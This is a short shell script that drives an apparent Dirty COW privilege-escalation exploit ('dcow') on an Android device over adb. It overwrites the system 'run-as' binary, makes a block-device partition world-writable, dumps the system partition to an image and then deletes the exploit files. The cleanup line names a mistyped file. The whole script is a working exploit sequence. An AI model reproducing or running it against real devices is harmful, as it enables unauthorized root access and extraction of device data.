#!/bin/sh

adb push dcow /data/local/tmp/
adb shell chmod 755 /data/local/tmp/dcow
adb push run-as /data/local/tmp/
adb shell /data/local/tmp/dcow /data/local/tmp/run-as /system/bin/run-as
adb shell "run-as chmod 666 /dev/block/mmcblk0p16"
adb pull /dev/block/mmcblk0p16 16-system.im
adb shell rm /data/local/tmp/run-asg /data/local/tmp/dcow
